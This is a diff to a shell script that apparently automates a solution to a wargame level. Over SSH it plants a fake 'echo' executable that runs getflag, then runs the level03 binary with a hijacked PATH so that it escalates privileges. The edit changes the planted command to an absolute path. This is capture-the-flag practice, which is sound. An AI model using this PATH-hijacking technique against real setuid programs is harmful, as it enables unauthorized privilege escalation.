@@ -142,7 +142,7 @@ main() {
 
     init_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username" "$level03_password" || exit 1;
     ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "mkdir -p '$fake_bin_dir'";
-    ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "echo 'getflag' > '$fake_echo_bin' && chmod +x '$fake_echo_bin'";
+    ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "echo '/bin/getflag' > '$fake_echo_bin' && chmod +x '$fake_echo_bin'";
     checkflag=$(ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "PATH=$fake_bin_dir:$PATH /home/user/level03/level03" | head -n 1 | awk '{print $NF}');
     ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "rm -rf '$fake_bin_dir'";
     close_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username";
